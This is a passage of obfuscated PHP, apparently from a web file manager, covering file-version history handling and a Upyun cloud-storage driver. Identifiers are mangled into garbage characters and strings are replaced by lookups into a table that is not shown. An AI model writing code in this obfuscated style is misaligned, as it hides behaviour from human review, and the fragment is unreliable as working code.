{ $€õ‚®Ó¬ =& $_SERVER[¼’ç§¼´]; $ÍÅâÙ¦ = array(); $ª–Å€Œì = array(); foreach ($Óñ¨»˜ as $ÏàèÎ‘‹) { $¨Ñ’í§³ = get_path_father($ÏàèÎ‘‹); if (!$ª–Å€Œì[$¨Ñ’í§³]) { $ª–Å€Œì[$¨Ñ’í§³] = array(); } $ª–Å€Œì[$¨Ñ’í§³][] = get_path_this($ÏàèÎ‘‹); } foreach ($ª–Å€Œì as $¨Ñ’í§³ => $òóÌ‹ø÷) { $™ßô•Òê = self::parsePath($¨Ñ’í§³); if (!$™ßô•Òê) { continue; } foreach ($òóÌ‹ø÷ as $ÚæÁ€¿÷) { $ìÖã£ü© = self::listData(rtrim($™ßô•Òê, $€õ‚®Ó¬[8]) . $€õ‚®Ó¬[8] . $ÚæÁ€¿÷, !1); if ($ìÖã£ü© && $ìÖã£ü©[$€õ‚®Ó¬[456]]) { $ÍÅâÙ¦[rtrim($¨Ñ’í§³, $€õ‚®Ó¬[8]) . $€õ‚®Ó¬[8] . $ÚæÁ€¿÷] = count($ìÖã£ü©[$€õ‚®Ó¬[456]]); } } } return $ÍÅâÙ¦; } public static function add($‡‚Ù¬Î®) { $÷ğã°ã =& $_SERVER[¼’ç§¼´]; $ıİêİ€ = self::listData($‡‚Ù¬Î®); if (!$ıİêİ€) { return; } $îÜÏØëò = Model($÷ğã°ã[858])->get($÷ğã°ã[1333]); $Ó…ÃøĞ = intval($GLOBALS[$÷ğã°ã[6]][$÷ğã°ã[92]][$÷ğã°ã[1311]]); $é®û„¿ = $îÜÏØëò == $÷ğã°ã[1334] ? min(5, $Ó…ÃøĞ) : $Ó…ÃøĞ; if ($Ó…ÃøĞ <= 0) { return; } $š„ıïÆ = IO::info($‡‚Ù¬Î®); $›•Ü‰×š = $ıİêİ€[$÷ğã°ã[456]]; if ($š„ıïÆ[$÷ğã°ã[79]] == 0) { return; } if ($š„ıïÆ[$÷ğã°ã[79]] >= 1024 * 1024 * 500) { return !1; } $ÌÖûÛ‡Ö = IO::hashSimple($‡‚Ù¬Î®); if ($›•Ü‰×š && $›•Ü‰×š[0][$÷ğã°ã[686]] == $ÌÖûÛ‡Ö) { return !0; } if (array_key_exists($÷ğã°ã[235], $š„ıïÆ) && !$š„ıïÆ[$÷ğã°ã[235]]) { return !1; } $öÛÉ¸ø† = short_id(time()); $–àùÚŒ = array($÷ğã°ã[486] => $öÛÉ¸ø†, $÷ğã°ã[686] => $ÌÖûÛ‡Ö, $÷ğã°ã[32] => $š„ıïÆ[$÷ğã°ã[32]] . $÷ğã°ã[10] . date($÷ğã°ã[1335]) . rand_string(1), $÷ğã°ã[79] => $š„ıïÆ[$÷ğã°ã[79]], $÷ğã°ã[538] => USER_ID, $÷ğã°ã[233] => time(), $÷ğã°ã[1336] => $÷ğã°ã[12]); IO::mkdir($ıİêİ€[$÷ğã°ã[1337]]); $´äöºìˆ = IO::copy($‡‚Ù¬Î®, $ıİêİ€[$÷ğã°ã[1337]], !1, $–àùÚŒ[$÷ğã°ã[32]]); if (!$´äöºìˆ) { self::clearEmptyFolder($ıİêİ€[$÷ğã°ã[1337]]); return !1; } array_unshift($›•Ü‰×š, $–àùÚŒ); if (count($›•Ü‰×š) > $é®û„¿) { $í¼“ÜÌ¡ = array_slice($›•Ü‰×š, $é®û„¿); foreach ($í¼“ÜÌ¡ as $‡ğÌğˆÕ) { IO::remove($ıİêİ€[$÷ğã°ã[1337]] . $‡ğÌğˆÕ[$÷ğã°ã[32]]); } $›•Ü‰×š = array_slice($›•Ü‰×š, 0, $é®û„¿); } return self::saveData($ıİêİ€[$÷ğã°ã[1338]], $›•Ü‰×š); } public static function remove($õÆø®šå, $Ù¥‰ŠÛÓ) { $îİáˆüô =& $_SERVER[¼’ç§¼´]; $ª¥½®õ = self::listData($õÆø®šå); $²„ù¡å = array(); if (!$ª¥½®õ) { return !1; } foreach ($ª¥½®õ[$îİáˆüô[456]] as $®»¥¯Ñˆ) { if ($®»¥¯Ñˆ[$îİáˆüô[486]] == $Ù¥‰ŠÛÓ) { IO::remove($ª¥½®õ[$îİáˆüô[1337]] . $®»¥¯Ñˆ[$îİáˆüô[32]]); continue; } $²„ù¡å[] = $®»¥¯Ñˆ; } return self::saveData($ª¥½®õ[$îİáˆüô[1338]], $²„ù¡å); } public static function clear($¿»ÂıÎÅ, $í©¢”úË = true) { $ßîïÛßš =& $_SERVER[¼’ç§¼´]; $êŸ­ÑÈÈ = self::listData($¿»ÂıÎÅ, $í©¢”úË); if (!$êŸ­ÑÈÈ) { return !1; } foreach ($êŸ­ÑÈÈ[$ßîïÛßš[456]] as $­‘¯ú’Š) { IO::remove($êŸ­ÑÈÈ[$ßîïÛßš[1337]] . $­‘¯ú’Š[$ßîïÛßš[32]]); } return self::saveData($êŸ­ÑÈÈ[$ßîïÛßš[1338]], array()); } public static function moveHistory($¿ü‹ıÌÍ, $ôõ©†÷ä = '', $—¼¤¼¢ˆ = '') { $ı£„ëœş =& $_SERVER[¼’ç§¼´]; $ÊÊŠÑÙ = self::listData($¿ü‹ıÌÍ, !1); if (!$ÊÊŠÑÙ || !$ÊÊŠÑÙ[$ı£„ëœş[456]]) { return !1; } $âÂÒ÷œ® = $ı£„ëœş[1325]; $ôõ©†÷ä = $ôõ©†÷ä ? $ôõ©†÷ä : get_path_this($¿ü‹ıÌÍ); $—¼¤¼¢ˆ = $—¼¤¼¢ˆ ? $—¼¤¼¢ˆ : $ÊÊŠÑÙ[$ı£„ëœş[1337]]; $î’´êæå = substr(get_path_this($ÊÊŠÑÙ[$ı£„ëœş[1338]]), 0, -strlen($âÂÒ÷œ®)); foreach ($ÊÊŠÑÙ[$ı£„ëœş[456]] as $œ·éá¾¶ => $•ùÎ³â) { $±ƒçÊñ¢ = $ôõ©†÷ä . substr($•ùÎ³â[$ı£„ëœş[32]], strlen($î’´êæå)); $ëïé½º = IO::move($ÊÊŠÑÙ[$ı£„ëœş[1337]] . $•ùÎ³â[$ı£„ëœş[32]], $—¼¤¼¢ˆ, !1, $±ƒçÊñ¢); if ($ëïé½º) { $ÊÊŠÑÙ[$ı£„ëœş[456]][$œ·éá¾¶][$ı£„ëœş[32]] = $±ƒçÊñ¢; } } $ÊÊŠÑÙ[$ı£„ëœş[1338]] = IO::move($ÊÊŠÑÙ[$ı£„ëœş[1338]], $—¼¤¼¢ˆ, !1, $ôõ©†÷ä . $âÂÒ÷œ®); self::saveData($ÊÊŠÑÙ[$ı£„ëœş[1338]], $ÊÊŠÑÙ[$ı£„ëœş[456]]); self::clearEmptyFolder($ÊÊŠÑÙ[$ı£„ëœş[1337]]); } public static function rollback($ûÒ…©´”, $°†ñÚš¥) { $ãüìŸ =& $_SERVER[¼’ç§¼´]; $¢İİçóé = self::listData($ûÒ…©´”); if (!$¢İİçóé) { return; } $†¾Í¯†Ş = IO::info($ûÒ…©´”); foreach ($¢İİçóé[$ãüìŸ[456]] as $‡ê• ™š => $Êğ±õéñ) { if ($Êğ±õéñ[$ãüìŸ[486]] == $°†ñÚš¥) { self::add($ûÒ…©´”); $õÂ„¹ë = $¢İİçóé[$ãüìŸ[1337]] . $Êğ±õéñ[$ãüìŸ[32]]; $ÁÏˆÑï = IO::copy($õÂ„¹ë, IO::pathFather($ûÒ…©´”), REPEAT_REPLACE, $†¾Í¯†Ş[$ãüìŸ[32]]); if ($ÁÏˆÑï) { self::remove($ûÒ…©´”, $°†ñÚš¥); } return $ÁÏˆÑï; } } return !1; } public static function setDetail($™¼Äˆ‘, $™äùØ˜ú, $Íå·Ó„†) { $ÇÎáÊ„ğ =& $_SERVER[¼’ç§¼´]; $€ÛÇ¡üğ = self::listData($™¼Äˆ‘); if (!$€ÛÇ¡üğ) { return; } foreach ($€ÛÇ¡üğ[$ÇÎáÊ„ğ[456]] as $“˜˜ùÛÇ => $³„¨õ­û) { if ($³„¨õ­û[$ÇÎáÊ„ğ[486]] == $™äùØ˜ú) { $€ÛÇ¡üğ[$ÇÎáÊ„ğ[456]][$“˜˜ùÛÇ][$ÇÎáÊ„ğ[1336]] = $Íå·Ó„†; self::saveData($€ÛÇ¡üğ[$ÇÎáÊ„ğ[1338]], $€ÛÇ¡üğ[$ÇÎáÊ„ğ[456]]); return !0; } } return !1; } public static function fileInfo($…«Â×Ü, $Ö¥½¿Ş) { $•–³âõ =& $_SERVER[¼’ç§¼´]; $Åøää = self::listData($…«Â×Ü); if (!$Åøää) { show_json(LNG($•–³âõ[108]), !1); } $ÑöÌ•» = $•–³âõ[12]; foreach ($Åøää[$•–³âõ[456]] as $Á ‹®“® => $Ä£î«) { if ($Ä£î«[$•–³âõ[486]] != $Ö¥½¿Ş) { continue; } $ÑöÌ•» = $Åøää[$•–³âõ[1337]] . $Ä£î«[$•–³âõ[32]]; break; } if (!$ÑöÌ•») { show_json(LNG($•–³âõ[108]), !1); } return IO::info($ÑöÌ•»); } public static function fileOut($®ÖòÃˆ¸, $ŠÉóùÂ±, $ï¬ˆüíÙ = false) { $Ò®ÖåÏü =& $_SERVER[¼’ç§¼´]; $äªÑ¡Å¦ = self::fileInfo($®ÖòÃˆ¸, $ŠÉóùÂ±); $úÅşÆÃŒ =& $GLOBALS[$Ò®ÖåÏü[7]]; $ï¬ˆüíÙ = isset($úÅşÆÃŒ[$Ò®ÖåÏü[1288]]) && $úÅşÆÃŒ[$Ò®ÖåÏü[1288]] == 1; if (isset($úÅşÆÃŒ[$Ò®ÖåÏü[33]]) && $úÅşÆÃŒ[$Ò®ÖåÏü[33]] == $Ò®ÖåÏü[1339]) { return IO::fileOutImage($äªÑ¡Å¦[$Ò®ÖåÏü[87]], $úÅşÆÃŒ[$Ò®ÖåÏü[1340]]); } IO::fileOut($äªÑ¡Å¦[$Ò®ÖåÏü[87]], $ï¬ˆüíÙ, get_path_this($®ÖòÃˆ¸)); } public static function listData($¦‰©ÈÄ, $Ù²Åı€¹ = true) { $ß¥ùõÓï =& $_SERVER[¼’ç§¼´]; if ($Ù²Åı€¹ && !IO::exist($¦‰©ÈÄ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¦‰©ÈÄ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÖğºŠô = self::pathHistory($¦‰©ÈÄ); $Ôî— ëı = array($ß¥ùõÓï[1338] => $ÖğºŠô . $ß¥ùõÓï[1325], $ß¥ùõÓï[1337] => rtrim(get_path_father($ÖğºŠô), $ß¥ùõÓï[8]) . $ß¥ùõÓï[8], $ß¥ùõÓï[456] => array()); $ËµîşÍ’ = IO::getContent($Ôî— ëı[$ß¥ùõÓï[1338]]); if ($ËµîşÍ’) { $ó¥õş‡‰ = json_decode($ËµîşÍ’, !0); if (is_array($ó¥õş‡‰)) { $Ôî— ëı[$ß¥ùõÓï[456]] = $ó¥õş‡‰; } } return $Ôî— ëı; } private static function saveData($½ûŒ…ã³, $Ê›ÁÛ²…) { $¸¨£„ó… =& $_SERVER[¼’ç§¼´]; self::log($¸¨£„ó…[1341] . $½ûŒ…ã³ . $¸¨£„ó…[74] . count($Ê›ÁÛ²…), $¸¨£„ó…[840]); if ($Ê›ÁÛ²…) { return IO::setContent($½ûŒ…ã³, json_encode($Ê›ÁÛ²…)); } $âÁõÑÚ¶ = IO::pathFather($½ûŒ…ã³); IO::remove($½ûŒ…ã³); self::clearEmptyFolder($âÁõÑÚ¶); return !0; } public static function clearEmptyFolder($»†ö‹Ò÷) { $¿”ÖÃš =& $_SERVER[¼’ç§¼´]; if (trim($»†ö‹Ò÷, $¿”ÖÃš[8]) == trim(self::$_historyBase, $¿”ÖÃš[8])) { return; } $å¶­Ò”Š = IO::pathFather($»†ö‹Ò÷); $ëš‹úñ = IO::has($»†ö‹Ò÷, !0); if ($ëš‹úñ[$¿”ÖÃš[241]] > 0 || $ëš‹úñ[$¿”ÖÃš[242]] > 0) { return; } IO::remove($»†ö‹Ò÷); self::clearEmptyFolder($å¶­Ò”Š); } private static function getBasePath() { $ÕĞœ³ =& $_SERVER[¼’ç§¼´]; $ÁĞ•İç‰ = Model($ÕĞœ³[1342])->get($ÕĞœ³[1343]); if ($ÁĞ•İç‰) { if (!IO::exist($ÁĞ•İç‰)) { IO::mkdir($ÁĞ•İç‰); } if (get_path_this($ÁĞ•İç‰) == $ÕĞœ³[1328]) { $©”Òû–¦ = $ÕĞœ³[1344] . rand_string(8); @rename($ÁĞ•İç‰, get_path_father($ÁĞ•İç‰) . $ÕĞœ³[8] . $©”Òû–¦); $ÁĞ•İç‰ = DATA_PATH . $©”Òû–¦ . $ÕĞœ³[8]; file_put_contents(DATA_PATH . $ÕĞœ³[1275], $ÕĞœ³[12]); Model($ÕĞœ³[1342])->set($ÕĞœ³[1343], $ÁĞ•İç‰); } return $ÁĞ•İç‰; } $ÁĞ•İç‰ = DATA_PATH . $ÕĞœ³[1344] . rand_string(8) . $ÕĞœ³[8]; $ÁĞ•İç‰ = IO::mkdir($ÁĞ•İç‰); $ÁĞ•İç‰ = rtrim($ÁĞ•İç‰, $ÕĞœ³[8]) . $ÕĞœ³[8]; file_put_contents($ÁĞ•İç‰ . $ÕĞœ³[1275], $ÕĞœ³[12]); file_put_contents(DATA_PATH . $ÕĞœ³[1275], $ÕĞœ³[12]); Model($ÕĞœ³[1342])->set($ÕĞœ³[1343], $ÁĞ•İç‰); return $ÁĞ•İç‰; } } goto A‚Õ’ÈƒŒÆ; FˆêŞº’ã: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\57\x2f\166\x30\x2e\141\160\151\x2e\165\x70\x79\165\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÙÎ«â±Ö) { parent::__construct(); $this->_init($ÙÎ«â±Ö); } public function _init($ÂÖĞŒÌœ) { $­Üµ£µß =& $_SERVER[¼’ç§¼´]; foreach ($ÂÖĞŒÌœ as $‰¸¿œ÷¼ => $İŒâõÒ¾) { if (isset($this->{$‰¸¿œ÷¼})) { $this->{$‰¸¿œ÷¼} = $İŒâõÒ¾; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($­Üµ£µß[1555] . LNG($­Üµ£µß[1474])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($÷‚Í¹“Å, $œ¹ßıœÊ = "\x47\x45\x54") { $áßˆĞ¨ =& $_SERVER[¼’ç§¼´]; $‡¢àÍÎ³ = gmdate($áßˆĞ¨[1503]); $Íî´ƒÊĞ = base64_encode(hash_hmac($áßˆĞ¨[1556], "{$œ¹ßıœÊ}\46{$÷‚Í¹“Å}\x26{$‡¢àÍÎ³}", md5("{$this->userpass}"), !0)); $–öªÓÚŞ = array("\101\x75\x74\150\x6f\162\151\x7a\141\x74\151\x6f\x6e\x3a\x55\120\x59\125\x4e\40{$this->username}\72{$Íî´ƒÊĞ}", "\x44\141\x74\x65\72{$‡¢àÍÎ³}"); return $–öªÓÚŞ; } public function ussRequest($¢Ò‡¢¶, $©¢¢ç = "\107\105\x54", $¥ã™­»Ê = false, $’ËØ¹¢ = false, $ŸÌÎü½ò = false) { $ •ïûËÍ =& $_SERVER[¼’ç§¼´]; $¢Ò‡¢¶ = trim($¢Ò‡¢¶, $ •ïûËÍ[8]); $¸İ‘˜Ò = "\57{$this->bucket}\x2f" . rawurlencode($¢Ò‡¢¶); $â¨¼Òº = $this->ussHeaders($¸İ‘˜Ò, $©¢¢ç); if ($’ËØ¹¢) { $â¨¼Òº = array_merge($â¨¼Òº, $’ËØ¹¢); } $éÖÑ‹Ó² = url_request($this->endpoint . $¸İ‘˜Ò, $©¢¢ç, $¥ã™­»Ê, $â¨¼Òº, $ŸÌÎü½ò); if (!$éÖÑ‹Ó²) { $ÆøÒ‚›” = LNG($ •ïûËÍ[1557]); $this->writeLog($ÆøÒ‚›”); return array($ •ïûËÍ[1306] => !1, $ •ïûËÍ[1296] => $ÆøÒ‚›”); } if (strtolower($©¢¢ç) == $ •ïûËÍ[229] || in_array($éÖÑ‹Ó²[$ •ïûËÍ[1306]], array($ •ïûËÍ[263], $ •ïûËÍ[1558]))) { $¥ã™­»Ê = $éÖÑ‹Ó²[$ •ïûËÍ[1559]]; if (!$éÖÑ‹Ó²[$ •ïûËÍ[838]]) { $¥ã™­»Ê = isset($¥ã™­»Ê[0]) ? $¥ã™­»Ê[0] : $ •ïûËÍ[12]; } } else { $¥ã™­»Ê = json_decode($éÖÑ‹Ó²[$ •ïûËÍ[1296]], !0); if (!$¥ã™­»Ê) { $¥ã™­»Ê = $éÖÑ‹Ó²[$ •ïûËÍ[1296]]; } else { if (!$éÖÑ‹Ó²[$ •ïûËÍ[838]] && isset($¥ã™­»Ê[$ •ïûËÍ[1560]])) { $¥ã™­»Ê = $¥ã™­»Ê[$ •ïûËÍ[1560]]; } } } if (!$éÖÑ‹Ó²[$ •ïûËÍ[838]]) { $this->writeLog($this->__errorMessage($¥ã™­»Ê)); } return array($ •ïûËÍ[1306] => $éÖÑ‹Ó²[$ •ïûËÍ[838]], $ •ïûËÍ[1296] => $¥ã™­»Ê); } private function __errorMessage($’Êé¸Ûà) { $‘úÙÔ‡Å =& $_SERVER[¼’ç§¼´]; if (!$’Êé¸Ûà) { return $‘úÙÔ‡Å[12]; } static $’¼À¡¨µ = null; if (!$’¼À¡¨µ) { $’¼À¡¨µ = I18n::getType(); } if ($’¼À¡¨µ != $‘úÙÔ‡Å[1513]) { return $’Êé¸Ûà; } $Ó€Â‹Ã = array($‘úÙÔ‡Å[1561] => $‘úÙÔ‡Å[1562], $‘úÙÔ‡Å[1563] => $‘úÙÔ‡Å[1564], $‘úÙÔ‡Å[1565] => $‘úÙÔ‡Å[1564], $‘úÙÔ‡Å[1566] => $‘úÙÔ‡Å[1567], $‘úÙÔ‡Å[1568] => $‘úÙÔ‡Å[1569], $‘úÙÔ‡Å[1570] => $‘úÙÔ‡Å[1571], $‘úÙÔ‡Å[1572] => $‘úÙÔ‡Å[1573]); return isset($Ó€Â‹Ã[$’Êé¸Ûà]) ? $Ó€Â‹Ã[$’Êé¸Ûà] : $’Êé¸Ûà; } public function mkfile($°æÌÆü‚, $ÜÌÌŸè = '', $ªç¯® = REPEAT_RENAME) { if ($this->setContent($°æÌÆü‚, $ÜÌÌŸè)) { return $this->getPathOuter($°æÌÆü‚); } return !1; } public function mkdir($šÄí”ŞÉ, $ÒÇó‰ÏÙ = REPEAT_SKIP) { $ªÄĞ¼ãó =& $_SERVER[¼’ç§¼´]; $èÓŞôª„ = trim($šÄí”ŞÉ, $ªÄĞ¼ãó[8]); if ($this->_isFolder($èÓŞôª„)) { return $this->getPathOuter($èÓŞôª„); } $êÔœ‚Êİ = array($ªÄĞ¼ãó[1574]); $ÕœÅºµö = $this->ussRequest($èÓŞôª„, $ªÄĞ¼ãó[290], !1, $êÔœ‚Êİ); return $ÕœÅºµö[$ªÄĞ¼ãó[1306]] ? $this->getPathOuter($èÓŞôª„) : !1; } public function copyFile($¸€íÖ„ü, $ñ ±©ùò) { $‰İÄİ¤ô =& $_SERVER[¼’ç§¼´]; $¼çş¨‡í = array($‰İÄİ¤ô[1575] . "\x2f{$this->bucket}\x2f{$¸€íÖ„ü}", $‰İÄİ¤ô[1576]); $Í×ÏƒÕÃ = $this->ussRequest($ñ ±©ùò, $‰İÄİ¤ô[255], !1, $¼çş¨‡í); return $Í×ÏƒÕÃ[$‰İÄİ¤ô[1306]] ? !0 : $this->getPathOuter($ñ ±©ùò); } public function moveFile($×’€†ƒ, $¯®Æ¯ö³) { $êé©¡æœ =& $_SERVER[¼’ç§¼´]; $ÏÚàñ¥¶ = array($êé©¡æœ[1577] . "\x2f{$this->bucket}\57{$×’€†ƒ}", $êé©¡æœ[1576]); $€ÑŠ¬ğ¹ = $this->ussRequest($¯®Æ¯ö³, $êé©¡æœ[255], !1, $ÏÚàñ¥¶); return $€ÑŠ¬ğ¹[$êé©¡æœ[1306]] ? !0 : $this->getPathOuter($¯®Æ¯ö³); } public function delFile($Øéõ©°Ã) { $‘şØ•İí =& $_SERVER[¼’ç§¼´]; $¤›İ†äÎ = $this->ussRequest($Øéõ©°Ã, $‘şØ•İí[1578]); return $¤›İ†äÎ[$‘şØ•İí[1306]] ? !0 : !1; } public function delFolder($€¶æÚòä) { $®èûöùÂ =& $_SERVER[¼’ç§¼´]; if (!$this->exist($€¶æÚòä)) { return !0; } $this->listItemCache = !1; $ì¸Ã‘ = $¦ÁìÑ½ = array(); $this->fileList($€¶æÚòä, $ì¸Ã‘, $¦ÁìÑ½, !0); $this->listItemCache = !0; foreach ($¦ÁìÑ½ as $ÁÂÒ‘ã) { $À½ä®ñî = $this->ussRequest($ÁÂÒ‘ã[$®èûöùÂ[32]], $®èûöùÂ[1578]); if (!$À½ä®ñî[$®èûöùÂ[1306]]) { return !1; } } usort($ì¸Ã‘, function ($¿‰¨ğÍä, $¢–¿°ºŒ) { $ÑŒ€ÜË¥ =& $_SERVER[¼’ç§¼´]; return substr_count($¢–¿°ºŒ, $ÑŒ€ÜË¥[8]) - substr_count($¿‰¨ğÍä, $ÑŒ€ÜË¥[8]); }); foreach ($ì¸Ã‘ as $ãÌ¬ÁÖœ) { $À½ä®ñî = $this->ussRequest($ãÌ¬ÁÖœ, $®èûöùÂ[1578]); if (!$À½ä®ñî[$®èûöùÂ[1306]]) { return !1; } } $À½ä®ñî = $this->ussRequest($€¶æÚòä, $®èûöùÂ[1578]); return $À½ä®ñî[$®èûöùÂ[1306]]; } public function rename($µ¤ïöä, $²É¥ûÊ) { if ($this->isFile($µ¤ïöä)) { $²É¥ûÊ = get_path_father($µ¤ïöä) . $²É¥ûÊ; return $this->moveFile($µ¤ïöä, $²É¥ûÊ); } return $this->renameObject($µ¤ïöä, $²É¥ûÊ); } public function fileInfo($È‚üÇ¸÷, $óèŞ›Ùç = false, $ˆğ©¯š™ = array()) { $Â±ĞÃÄ =& $_SERVER[¼’ç§¼´]; $À¦åÓò» = array($Â±ĞÃÄ[32] => $this->pathThis($È‚üÇ¸÷), $Â±ĞÃÄ[87] => $this->getPathOuter($Â±ĞÃÄ[8] . $È‚üÇ¸÷), $Â±ĞÃÄ[33] => $Â±ĞÃÄ[232], $Â±ĞÃÄ[79] => isset($ˆğ©¯š™[$Â±ĞÃÄ[79]]) ? $ˆğ©¯š™[$Â±ĞÃÄ[79]] : 0, $Â±ĞÃÄ[169] => $this->ext($È‚üÇ¸÷)); if ($óèŞ›Ùç) { return $À¦åÓò»; } $À¦åÓò»[$Â±ĞÃÄ[233]] = $À¦åÓò»[$Â±ĞÃÄ[88]] = 0; $À¦åÓò»[$Â±ĞÃÄ[234]] = $À¦åÓò»[$Â±ĞÃÄ[235]] = !0; if (empty($ˆğ©¯š™)) { $ˆğ©¯š™ = $this->objectMeta($È‚üÇ¸÷); if (!$ˆğ©¯š™) { return $À¦åÓò»; } } $À¦åÓò»[$Â±ĞÃÄ[233]] = intval($ˆğ©¯š™[$Â±ĞÃÄ[1579]]); $À¦åÓò»[$Â±ĞÃÄ[88]] = intval($ˆğ©¯š™[$Â±ĞÃÄ[1580]]); $À¦åÓò»[$Â±ĞÃÄ[79]] = $ˆğ©¯š™[$Â±ĞÃÄ[79]]; return $À¦åÓò»; } public function folderInfo($‡ÅàÙ¥™, $İıŠò®Ó = false) { $›êä¶í© =& $_SERVER[¼’ç§¼´]; $–âÖÄğœ = array($›êä¶í©[32] => $this->pathThis($‡ÅàÙ¥™), $›êä¶í©[87] => $this->getPathOuter($›êä¶í©[8] . $‡ÅàÙ¥™), $›êä¶í©[33] => $›êä¶í©[78]); if ($İıŠò®Ó) { return $–âÖÄğœ; } $–âÖÄğœ[$›êä¶í©[233]] = $–âÖÄğœ[$›êä¶í©[88]] = 0; $–âÖÄğœ[$›êä¶í©[234]] = $–âÖÄğœ[$›êä¶í©[235]] = !0; if (empty($çÈùŞ¦)) { $çÈùŞ¦ = $this->objectMeta($‡ÅàÙ¥™); if (!$çÈùŞ¦) { return $–âÖÄğœ; } } $–âÖÄğœ[$›êä¶í©[233]] = intval($çÈùŞ¦[$›êä¶í©[1579]]); $–âÖÄğœ[$›êä¶í©[88]] = intval($çÈùŞ¦[$›êä¶í©[1580]]); return $–âÖÄğœ; } private function listObjs($·Ãš£öò, $ôŸ„©ù³ = 0, $¢È¬°¯™ = 1000) { $¶œÆâõ =& $_SERVER[¼’ç§¼´]; $İõ®¨® = array($¶œÆâõ[1581], $¶œÆâõ[1582] . $¢È¬°¯™); if ($ôŸ„©ù³) { $İõ®¨®[] = $¶œÆâõ[1583] . $ôŸ„©ù³; } $êş‰“Ú = $this->ussRequest($·Ãš£öò, $¶œÆâõ[1505], !1, $İõ®¨®); return !$êş‰“Ú[$¶œÆâõ[1306]] ? !1 : $êş‰“Ú[$¶œÆâõ[1296]]; } private function fileList($šÔª€¨•, &$‘´¾ç·Ô, &$ø–±’‘–, $Ö¡¤Ğº = false) { $’‡–®Ã =& $_SERVER[¼’ç§¼´]; $Œ¯Ğ¦€ = $’‡–®Ã[12]; $ÍÆü‚‰¤ = 1000; $õ²Ó—˜ú = rtrim($šÔª€¨•, $’‡–®Ã[8]) . $’‡–®Ã[8]; while (!0) { check_abort(); $ú‹Ó¢¸ß = $this->listObjs($šÔª€¨•, $Œ¯Ğ¦€, $ÍÆü‚‰¤); if (!$ú‹Ó¢¸ß) { return !1; } $Œ¯Ğ¦€ = isset($ú‹Ó¢¸ß[$’‡–®Ã[1584]]) ? $ú‹Ó¢¸ß[$’‡–®Ã[1584]] : $’‡–®Ã[12]; $†ÂƒÊ¡Ö = isset($ú‹Ó¢¸ß[$’‡–®Ã[1585]]) ? $ú‹Ó¢¸ß[$’‡–®Ã[1585]] : array(); foreach ($†ÂƒÊ¡Ö as $‰ëúİØÙ) { $É“ò•åû = $‰ëúİØÙ[$’‡–®Ã[33]] == $’‡–®Ã[78] ? !0 : !1; $Ú©‡ì¾¦ = ltrim($õ²Ó—˜ú . $‰ëúİØÙ[$’‡–®Ã[32]], $’‡–®Ã[8]) . ($É“ò•åû ? $’‡–®Ã[8] : $’‡–®Ã[12]); $¤‚‹çš‘ = array($’‡–®Ã[32] => $Ú©‡ì¾¦, $’‡–®Ã[33] => $É“ò•åû ? $’‡–®Ã[78] : $’‡–®Ã[232], $’‡–®Ã[79] => $‰ëúİØÙ[$’‡–®Ã[414]], $’‡–®Ã[1580] => $‰ëúİØÙ[$’‡–®Ã[1586]]); $this->cacheMethodInfoSet($Ú©‡ì¾¦, $É“ò•åû, $¤‚‹çš‘); if ($É“ò•åû) { $‘´¾ç·Ô[] = $Ú©‡ì¾¦; if ($Ö¡¤Ğº) { $this->fileList($Ú©‡ì¾¦, $‘´¾ç·Ô, $ø–±’‘–, $Ö¡¤Ğº); } continue; } $ø–±’‘–[] = $¤‚‹çš‘; } if (count($†ÂƒÊ¡Ö) < $ÍÆü‚‰¤) { break; } } $this->cacheMethodInfoSet($šÔª€¨•, !0); } public function listPath($å¥†‰×ö, $Ó­ÊË¶ß = false) { $Ğí¿Úã› =& $_SERVER[¼’ç§¼´]; $İ‘Î„Ğ´ = $ùÕ³åß¿ = array(); $this->fileList($å¥†‰×ö, $İ‘Î„Ğ´, $ùÕ³åß¿); foreach ($İ‘Î„Ğ´ as $ïÁ²ª«Â => $ÖúğÒ¯) { $İ‘Î„Ğ´[$ïÁ²ª«Â] = $this->folderInfo($ÖúğÒ¯, $Ó­ÊË¶ß); } foreach ($ùÕ³åß¿ as $ïÁ²ª«Â => $ÖúğÒ¯) { $ùÕ³åß¿[$ïÁ²ª«Â] = $this->fileInfo($ÖúğÒ¯[$Ğí¿Úã›[32]], $Ó­ÊË¶ß, $ÖúğÒ¯); } return array($Ğí¿Úã›[85] => $İ‘Î„Ğ´, $Ğí¿Úã›[86] => $ùÕ³åß¿); } public function has($±ÀÄŒ¥, $îş²Ò©Ó = false, $ºëĞ¸¡³ = true) { $´ô‚»ú¯ =& $_SERVER[¼’ç§¼´]; $ÍıƒµÍ± = $´ô‚»ú¯[12]; $ÕÄÙ¥ìÏ = 500; $ì”›Î® = 0; $¨¼¬“Áü = 0; $•ôÄ×í = rtrim($±ÀÄŒ¥, $´ô‚»ú¯[8]) . $´ô‚»ú¯[8]; while (!0) { check_abort(); $ŸñÏÎûÒ = $this->listObjs($±ÀÄŒ¥, $ÍıƒµÍ±, $ÕÄÙ¥ìÏ); if (!$ŸñÏÎûÒ) { return !1; } $ÍıƒµÍ± = isset($ŸñÏÎûÒ[$´ô‚»ú¯[1584]]) ? $ŸñÏÎûÒ[$´ô‚»ú¯[1584]] : $´ô‚»ú¯[12]; $¼µ‹àë = isset($ŸñÏÎûÒ[$´ô‚»ú¯[1585]]) ? $ŸñÏÎûÒ[$´ô‚»ú¯[1585]] : array(); if (empty($¼µ‹àë)) { break; } $ãšÔĞÀ¼ = array_filter($¼µ‹àë, function ($õé€Ïå) { $‚‚‰¨É =& $_SERVER[¼’ç§¼´]; return $õé€Ïå[$‚‚‰¨É[33]] == $‚‚‰¨É[78]; }); $¡Ã˜ËÀÎ = count($¼µ‹àë); $ãšÔĞÀ¼ = count($ãšÔĞÀ¼); $ñ³Üö¼ë = $¡Ã˜ËÀÎ - $ãšÔĞÀ¼; if ($îş²Ò©Ó) { $¨¼¬“Áü += $ãšÔĞÀ¼; $ì”›Î® += $ñ³Üö¼ë; if ($¡Ã˜ËÀÎ < $ÕÄÙ¥ìÏ) { break; } continue; } if ($ºëĞ¸¡³) { if ($ñ³Üö¼ë) { return !0; } } else { if 